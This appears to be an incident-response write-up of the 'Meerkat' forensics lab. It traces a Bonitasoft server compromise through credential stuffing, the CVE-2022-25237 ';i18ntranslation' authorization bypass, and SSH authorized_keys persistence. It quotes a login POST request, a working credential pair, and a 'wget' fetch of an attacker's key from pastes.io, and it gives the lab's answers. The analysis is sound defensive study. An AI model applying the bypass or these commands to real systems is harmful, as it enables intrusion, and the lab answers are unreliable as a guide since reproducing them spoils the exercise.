Meerkat 

  

As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised. 

  

Artifacts given: 

meerkat.pcap 

meerkat-alerts.json 

  

jq . meerkat-alerts.json > alerts.txt 

  

  

By going to statistics -> Endpoints, we can see the top talkers for IPV4, all have higher than 1500+ packets sent 

172.31.6.44 

54.144.148.213  

156.146.62.213 

34.207.150.13 

  

Top three conversations is between: 

156.146.62.213 -> 172.31.6.44 

172.31.6.44 -> 34.207.150.13 

172.31.6.44 -> 54.144.148.213 

  

Looking in the json file, we see a lot of alerts with a signature pertaining to Bonitasoft 

{ 

    "ts": "2023-01-19T15:39:19.357536Z", 

    "event_type": "alert", 

    "src_ip": "138.199.59.221", 

    "src_port": 53401, 

    "dest_ip": "172.31.6.44", 

    "dest_port": 8080, 

    "vlan": null, 

    "proto": "TCP", 

    "app_proto": "http", 

    "alert": { 

      "severity": 1, 

      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)", 

      "category": "Attempted Administrator Privilege Gain", 

  

  

  

Given the src ip and dest ip above, we see traffic such as post request to the webserver of 172.31.6.44 over port 8080 

  

POST /bonita/loginservice HTTP/1.1 

Host: forela.co.uk:8080 

User-Agent: python-requests/2.28.1 

Accept-Encoding: gzip, deflate 

Accept: */* 

Connection: keep-alive 

Content-Type: application/x-www-form-urlencoded 

Cookie: x=x 

Content-Length: 60 

  

username=Cariotta.Whife%40forela.co.uk&password=x3hoU0&_l=enHTTP/1.1 401  

Content-Length: 0 

Date: Thu, 19 Jan 2023 15:32:34 GMT 

Keep-Alive: timeout=20 

Connection: keep-alive 

  

We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running? 

  

This is found in the JSON file,  we see numerous alerts. 

  

BonitaSoft 

  

We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out? 

  

By looking at the web traffic, we see a lot of post requests putting in credentials of username and password 

  

Credential Stuffing 

  

Does the vulnerability exploited have a CVE assigned - and if so, which one? 

  

Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions. 

  

CVE_2022_25237 from the json log file 

  

Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit? 

  

;i18ntranslation 

  

How many combinations of usernames and passwords were used in the credential stuffing attack? 

  

ip.addr==156.146.62.213 and http.request.method == "POST" 

  

56 

  

Which username and password combination was successful? 

  

seb.broom@forela.co.uk:g0vernm3nt 

  

  

During the credential stuffing, we typically only saw 401 errors. however with the credentials above, we saw a 204 success go through 

  

  

If any, which text sharing site did the attacker utilise? 

  

Go to statistics -> HTTP -> Requests 

  

We can see wget request to pastes.io 

  

  

Please provide the filename of the public key used by the attacker to gain persistence on our host. 

  

hffgra4unv  

  

from 

  

wget https://pastes.io/raw/hffgra4unv 

  

Can you confirm the file modified by the attacker to gain persistence? 

  

  

/home/ubuntu/.ssh/authorized_keys 

  

Can you confirm the MITRE technique ID of this type of persistence mechanism? 

  

  

T1098.004 

Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.  

  

  

Incident: 

  

BonitaSoft has an active CVE with the current service version running. The CVE is CVE-2022-25237 which allows an authentication/authorization bypass vulnerability due to broad exclude pattern. 

  

Users can append ;i18ntranslation to the request in order to access privileged API endpoints on the web server. This allowes for remote code execution by abusing the API actions. 

  

The attacker initially accessed the system through multiple attempts of credential stuffing (reusing credentials from past employee's username and their leaked password).  

  

After gaining initial access into the system as a user, the attacker exploited the CVE and performed multiple RCE.  

  

Some of which were whoami, wget, and curl.  

  

Additionally, the attacker performed a persistence technique by modifying authorized keys on the host device to keep access to the system. 

  
